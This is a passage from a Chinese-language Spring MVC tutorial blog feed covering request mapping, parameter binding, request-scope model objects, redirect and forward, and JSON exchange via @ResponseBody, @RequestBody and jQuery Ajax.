class="meta">@RequestMapping(&quot;/test01&quot;)</span></span><br><span class="line"><span class="comment">// @RequestMapping(value = &quot;/test01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test01&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="映射多个URL"><a href="#映射多个URL" class="headerlink" title="映射多个URL"></a>映射多个URL</h3><p>使用<code>@RequestMapping(&quot;&quot;,&quot;&quot;)</code>或指定<code>value</code>为数组类型即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/test03_01&quot;, &quot;/test03_02&quot;&#125;)</span></span><br><span class="line"><span class="comment">// @RequestMapping(value = &#123;&quot;/test03_01&quot;, &quot;/test03_02&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test03</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test03&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="映射URL在控制器上"><a href="#映射URL在控制器上" class="headerlink" title="映射URL在控制器上"></a>映射URL在控制器上</h3><p>提供了一种层级化的访问方式，需要先访问类层级路径才能访问方法层级</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/url&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test04&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">test04</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test04&quot;</span>);</span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时要访问到<code>test04()</code>方法需要访问<code>/url/test04</code>才可</p><h3 id="设置URL映射请求格式"><a href="#设置URL映射请求格式" class="headerlink" title="设置URL映射请求格式"></a>设置URL映射请求格式</h3><p>可以通过<code>method</code>属性设置支持的请求方式，如<code>method=RequestMethod.POST</code>如设置多种请求方式，以大括号包围，逗号隔开即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/test05&quot;, method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test05</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test05&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过参数名称映射URL"><a href="#通过参数名称映射URL" class="headerlink" title="通过参数名称映射URL"></a>通过参数名称映射URL</h3><p>设置<code>params</code>属性，该方法要求客户端通过特定的参数去访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(params = &quot;test06&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test06</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;test06&quot;</span>);</span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="参数绑定"><a href="#参数绑定" class="headerlink" title="参数绑定"></a>参数绑定</h2><p>用于将后端使用的参数与前端传入的参数进行绑定，使用<code>@RequestParam</code>注解放在形参前表示绑定</p><p>该注解的<code>name</code>属性可与前端的的参数名进行绑定，<code>defaultValue</code>属性用于设置默认值，<code>required</code>用于明确该参数是否必须，请求中若没有该参数会向客户端抛出400错误</p><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><p>基本类型传递时如果为空，可能会产生空指针异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(name=&quot;age&quot;, defaultValue=0)</span> <span class="type">int</span> num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="包装类型"><a href="#包装类型" class="headerlink" title="包装类型"></a>包装类型</h3><p>使用包装类型的优点在于其默认值为<code>null</code>，此时可以不设置<code>defaultValue</code>属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(Integer num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>可以不使用注解，但还是感觉用了会使代码逻辑更清晰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(name=&quot;age&quot;, defaultValue=0)</span> Integer num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(name=&quot;age&quot;)</span> Integer[] num)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>适用于客户端传递数组参数，类似<code>age=12 &amp;age=18 &amp;age=22</code></p><h3 id="JavaBean类型"><a href="#JavaBean类型" class="headerlink" title="JavaBean类型"></a>JavaBean类型</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(User user)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>bean类型参数不适用<code>@RequestParam</code>注解，客户端传递该对象的属性参数，若该<code>User</code>类有<code>id</code>和<code>role</code>两个属性，客户端传入类似<code>id=1 &amp;role=admin</code></p><h3 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h3><p>对于集合类型，需要先传入一个JavaBean类型，后端再通过JavaBean对象中的属性进行接收</p><p><strong>List列表</strong></p><p>若传递元素为基本类型，在bean中设置集合属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Integer&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收<code>test</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(Test test)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>客户端发送的参数需为<code>list=1 &amp;list=2 &amp;list=3</code></p><p>若传递元素为JavaBean类型，在bean中设置集合属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;User&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(List&lt;User&gt; list)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端发送的请求则应为<code>list[0].id=1 &amp;list[0].role=admin &amp;list[1].id=2 &amp;list[1].role=user</code></p><p><strong>Set集合</strong></p><p>绑定Set数据时，必须先在Set对象中添加相应数量的模型对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;User&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;User&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;User&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(Set&lt;User&gt; set)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.Set = set</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Map集合</strong></p><p>设置bean载体</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,User&gt; map =<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, User&gt; <span class="title function_">getMap</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMap</span><span class="params">(Map&lt;String, User&gt; map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 客户端发送的格式类似<code>map[&#39;a&#39;].id=1 &amp;map[&#39;a&#39;].role=admin &amp;map[&#39;b&#39;].id=2 &amp;map[&#39;b&#39;].role=user</code></p><br/><h2 id="请求域对象"><a href="#请求域对象" class="headerlink" title="请求域对象"></a>请求域对象</h2><h3 id="ModelAndView"><a href="#ModelAndView" class="headerlink" title="ModelAndView"></a>ModelAndView</h3><p>在先前的测试中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求映射地址 /hello.do</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        mv.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;hello spring mvc&quot;</span>);</span><br><span class="line">        mv.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>mv</code>就是一个请求域对象，它是要渲染的内容的载体，而返回值用于明确要渲染的模板。由于<code>ModelAndView</code>类可以用<code>setViewName()</code>方法指定要渲染的模板，所以可以直接返回对象，而除此之外还有许多方式可以达到一样的效果</p><h3 id="ModelMap"><a href="#ModelMap" class="headerlink" title="ModelMap"></a>ModelMap</h3><p><code>ModelMap</code>类使用<code>addAttribute()</code>方法设置jsp中的引用名<code>attributeName</code>和渲染内容<code>attributeValue</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(ModelMap modelMap)</span> &#123;</span><br><span class="line">modelMap.addAttribute(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;Model&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h3><p><code>Model</code>类的使用方法与<code>ModelMap</code>几乎一致</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">model.addAttribute(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;ModelMap&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>由于<code>map</code>没有<code>addAttribute()</code>方法，但<code>put()</code>方法也可以实现一样的功能</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">Map.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;Map&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HttpServletRequest"><a href="#HttpServletRequest" class="headerlink" title="HttpServletRequest"></a>HttpServletRequest</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;HttpServletRequest&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实以上方法究其根本还是把属性放入了一次请求<code>HttpServletRequest</code>的 作用域</p><br/><h3 id="重定向与请求转发"><a href="#重定向与请求转发" class="headerlink" title="重定向与请求转发"></a>重定向与请求转发</h3><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>返回值以<code>redirect:</code>开头会重定向到相应的jsp页面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:halo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样会重定向到<code>halo</code>这个<code>Controller</code>，此时会再次建立一个<code>HttpServletRequest</code>，也可以传递参数比如<code>redirect:halo?test=1</code></p><p>也可以通过<code>RedirectAttributes</code>类设置重定向的传递参数，该方法可以解决传参含中文乱码的问题</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(RedirectAttributes redirectAttributes)</span> &#123;</span><br><span class="line">redirectAttributes.addAttribute(<span class="string">&quot;测试&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;redirect:halo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ModelAndView</code>类也可以实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(ModelAndView modelAndView)</span> &#123;</span><br><span class="line">modelAndView.addObject(<span class="string">&quot;测试&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">modelAndView.setViewName(<span class="string">&quot;redirect:halo&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h3><p>请求转发直接调用跳转的页面，此时不会销毁前一次建立的<code>HttpServletRequest</code>，不存在丢失数据的问题，请求转发使用<code>forward:</code>前缀，也可以不使用，spring默认使用请求转发</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;forward:halo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求转发也可以传递参数，并且此时可以直接传中文</p><br/><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p>JSON作为一种数据传输格式在实际开发中获得了良好的应用，可以利用其直接返回对象、集合等类型</p><h3 id="ResponseBody注解"><a href="#ResponseBody注解" class="headerlink" title="@ResponseBody注解"></a><code>@ResponseBody</code>注解</h3><p>该注解用于将 Controller 的方法返回的对象，通过适当的 <code>HttpMessageConverter</code> 转换为指定格式后，写入到 Response 对象的 body 数据区，返回的数据不是 html 标签的页面，而是其他某种格式的数据时（如 json、xml 等）使用（通常用于ajax 请求）</p><h3 id="RequestBody注解"><a href="#RequestBody注解" class="headerlink" title="@RequestBody注解"></a><code>@RequestBody</code>注解</h3><p>该注解用于读取 Request 请求的 body 部分数据，使用系统默认配置的 <code>HttpMessageConverter</code> 进行解析，然后把相应的数据绑定到要返回的对象上，再把 <code>HttpMessageConverter</code> 返回的对象数据绑定到 controller 中方法的参数上</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>添加依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加json 依赖jar包 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>设置<code>servlet-context.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mvc 请求映射 处理器与适配器配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong><code>@ResponseBody</code>注解的使用</strong></p><p>可以将该注解标记在方法上</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setId(<span class="number">1</span>);</span><br><span class="line">    user.setName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或方法签名的访问修饰符右侧</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@ResponseBody</span> User <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setId(<span class="number">1</span>);</span><br><span class="line">    user.setName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时访问<code>/test</code>路径会返回格式化的JSON文本，若没有引入该注解，该页面无法正常访问</p><p> <strong>通过Ajax接收JSON数据</strong></p><p>前面的例子中，我们实现了后端返回JSON格式数据，但此时是直接打印在页面上的，想要前端接收数据并实现页面渲染需要使用一个接收器Ajax去接收JSON数据，要使用Ajax需要下载其js文件并在jsp文件中进行引入</p><p>ajax调用函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">testAjax</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:&#123;</span><br><span class="line">            <span class="string">&quot;testParam&quot;</span>:<span class="string">&quot;testValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后端响应方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">testRes</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setId(<span class="number">1</span>);</span><br><span class="line">    user.setUserName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>testAjax()</code>方法后，则会在浏览器控制台打印<code>{id:1,userName:&quot;admin&quot;}</code></p><p><strong><code>@RequestBody</code>注解的使用</strong></p><p>该注解用来处理<code>content-type</code>为<code>application/json</code>格式的字符串</p><p>可以将该注解标记在方法上</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestBody</span></span><br><span class="line"><span class="keyword">public</span> Void <span class="title function_">Test</span><span class="params">(User user)</span> &#123;</span><br><span class="line">System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者标记在形参左侧</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">Test</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 前端使用Ajax发送JSON数据</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">testAjax</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:<span class="string">&#x27;&#123;&quot;id&quot;:1,&quot;userName&quot;:&quot;admin&quot;&#125;&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringFramework框架-JDBC与事务控制</title>
      <link href="/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-JDBC%E4%B8%8E%E4%BA%8B%E5%8A%A1%E6%8E%A7%E5%88%B6/"/>
      <url>/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-JDBC%E4%B8%8E%E4%BA%8B%E5%8A%A1%E6%8E%A7%E5%88%B6/</url>
      
